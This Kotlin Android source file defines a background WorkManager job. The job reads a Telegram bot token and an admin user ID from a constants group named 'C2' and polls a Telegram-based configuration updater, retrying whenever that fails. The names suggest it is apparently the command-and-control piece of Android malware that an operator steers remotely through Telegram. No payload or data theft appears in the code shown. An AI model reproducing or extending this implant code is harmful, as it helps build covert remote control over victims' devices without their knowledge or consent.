package com.systemlinker.base

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.systemlinker.comm.TelegramConfigUpdater

class UpdateWorker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        val configStore = ConfigStore(applicationContext)
        
        // Credentials are now read from the central Constants file
        val botToken = Constants.C2.TELEGRAM_BOT_TOKEN
        val allowedUserId = Constants.C2.TELEGRAM_ADMIN_USER_ID
        
        val updater = TelegramConfigUpdater(botToken, allowedUserId, configStore)
        
        return try {
            updater.checkAndUpdate()
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }
}